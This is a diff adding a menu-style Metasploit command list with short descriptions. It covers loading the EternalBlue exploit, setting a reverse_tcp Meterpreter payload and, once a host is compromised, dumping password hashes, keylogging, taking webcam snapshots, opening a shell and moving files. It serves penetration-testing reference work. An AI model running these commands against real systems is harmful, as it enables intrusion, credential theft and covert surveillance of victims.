@@ -1,0 +1,136 @@
+# Metasploit Command List
+# Format: [\] command [/] description [X] menutitlename
+
+[X] Metasploit Command List
+
+[\] msfconsole
+[/] Start the Metasploit Framework console
+
+[\] search <keyword>
+[/] Search for exploits, payloads, or modules
+
+[\] use exploit/windows/smb/ms17_010_eternalblue
+[/] Load a specific exploit module
+
+[\] info
+[/] Show detailed information about the loaded module
+
+[\] show options
+[/] Display required and optional module settings
+
+[\] set RHOSTS <IP>
+[/] Set target host(s)
+
+[\] set RPORT <port>
+[/] Set target port
+
+[\] set LHOST <IP>
+[/] Set local host for payload callbacks
+
+[\] set LPORT <port>
+[/] Set local port for payload callbacks
+
+[\] show payloads
+[/] List compatible payloads for the selected exploit
+
+[\] set PAYLOAD windows/meterpreter/reverse_tcp
+[/] Set a specific payload
+
+[\] exploit
+[/] Run the exploit against the target
+
+[\] run
+[/] Alias for exploit
+
+[\] exploit -j
+[/] Run exploit as a background job
+
+[\] sessions
+[/] List active sessions
+
+[\] sessions -i <ID>
+[/] Interact with a specific session
+
+[\] sessions -k <ID>
+[/] Kill a session
+
+[\] background
+[/] Background the current session
+
+[\] sysinfo
+[/] Display system information of the compromised host
+
+[\] getuid
+[/] Show current user on the target system
+
+[\] shell
+[/] Drop into a system shell on the target
+
+[\] upload <file>
+[/] Upload a file to the target system
+
+[\] download <file>
+[/] Download a file from the target system
+
+[\] ps
+[/] List running processes on the target
+
+[\] migrate <PID>
+[/] Migrate Meterpreter to another process
+
+[\] hashdump
+[/] Dump Windows password hashes
+
+[\] keyscan_start
+[/] Start keylogger on the target
+
+[\] keyscan_dump
+[/] Dump captured keystrokes
+
+[\] webcam_list
+[/] List available webcams
+
+[\] webcam_snap
+[/] Take a snapshot from the webcam
+
+[\] portfwd add -l 4444 -p 3389 -r <target>
+[/] Forward local port to remote service
+
+[\] use auxiliary/scanner/portscan/tcp
+[/] Load TCP port scanner module
+
+[\] use auxiliary/scanner/http/http_version
+[/] Detect HTTP server version
+
+[\] use auxiliary/scanner/smb/smb_version
+[/] Detect SMB version
+
+[\] use post/windows/gather/hashdump
+[/] Run post-exploitation hash dump
+
+[\] use post/multi/recon/local_exploit_suggester
+[/] Suggest possible local privilege escalation exploits
+
+[\] db_nmap <IP>
+[/] Run Nmap and import results into Metasploit database
+
+[\] hosts
+[/] Show discovered hosts in the database
+
+[\] services
+[/] Show discovered services in the database
+
+[\] vulns
+[/] Show discovered vulnerabilities
+
+[\] creds
+[/] Show collected credentials
+
+[\] resource <file.rc>
+[/] Run a Metasploit resource script
+
+[\] load msgrpc
+[/] Enable Metasploit RPC server
+
+[\] exit
+[/] Exit Metasploit console
